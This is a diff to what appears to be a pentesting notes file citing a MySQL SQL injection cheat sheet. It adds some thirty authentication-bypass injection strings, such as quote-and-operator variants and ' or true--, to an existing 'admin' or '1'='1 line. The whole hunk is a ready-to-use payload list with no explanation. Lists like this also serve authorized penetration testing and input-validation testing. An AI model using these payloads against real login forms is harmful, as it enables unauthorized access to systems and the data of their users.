@@ -3,4 +3,35 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-she
 
 ```
 admin' or '1'='1 #
+-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
 ```
